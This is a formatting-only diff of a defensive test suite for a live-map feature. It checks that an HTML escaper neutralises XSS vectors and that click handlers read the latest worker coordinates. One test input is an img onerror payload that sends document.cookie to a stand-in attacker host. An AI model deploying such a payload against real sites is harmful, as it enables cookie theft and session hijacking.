@@ -11,7 +11,8 @@ describe('Live Map DOM XSS & Stale Coordinate Remediation Tests (SEC-001 / DEF-0
   });
 
   it('2. escapeHtml safely encodes img onerror and svg onload event handler vectors', () => {
-    const imgPayload = '<img src=x onerror=fetch("https://attacker.com/steal?cookie="+document.cookie)>';
+    const imgPayload =
+      '<img src=x onerror=fetch("https://attacker.com/steal?cookie="+document.cookie)>';
     const escapedImg = escapeHtml(imgPayload);
     assert.ok(!escapedImg.includes('<img'), 'Must escape angle brackets');
     assert.strictEqual(
@@ -33,20 +34,23 @@ describe('Live Map DOM XSS & Stale Coordinate Remediation Tests (SEC-001 / DEF-0
 
   it('4. Stale closure defense: latest worker map resolves freshest telemetry coordinates', () => {
     // Simulates the latestWorkersRef mechanism implemented in Live Map
-    const latestWorkersMap = new Map<string, { userId: string; longitude: number; latitude: number; speed: number }>();
+    const latestWorkersMap = new Map<
+      string,
+      { userId: string; longitude: number; latitude: number; speed: number }
+    >();
 
     // Initial worker emission at 09:00 AM (initial mount)
     const initialWorker = { userId: 'usr_01', longitude: 77.1025, latitude: 28.7041, speed: 0 };
     latestWorkersMap.set(initialWorker.userId, initialWorker);
 
     // Later telemetry update at 09:30 AM
-    const updatedWorker = { userId: 'usr_01', longitude: 77.1500, latitude: 28.7500, speed: 12.5 };
+    const updatedWorker = { userId: 'usr_01', longitude: 77.15, latitude: 28.75, speed: 12.5 };
     latestWorkersMap.set(updatedWorker.userId, updatedWorker);
 
     // Click handler reads from latestWorkersMap rather than closed-over initialWorker
     const resolvedWorker = latestWorkersMap.get('usr_01') || initialWorker;
-    assert.strictEqual(resolvedWorker.longitude, 77.1500, 'Must resolve latest longitude');
-    assert.strictEqual(resolvedWorker.latitude, 28.7500, 'Must resolve latest latitude');
+    assert.strictEqual(resolvedWorker.longitude, 77.15, 'Must resolve latest longitude');
+    assert.strictEqual(resolvedWorker.latitude, 28.75, 'Must resolve latest latitude');
     assert.strictEqual(resolvedWorker.speed, 12.5, 'Must reflect latest speed');
   });
 });
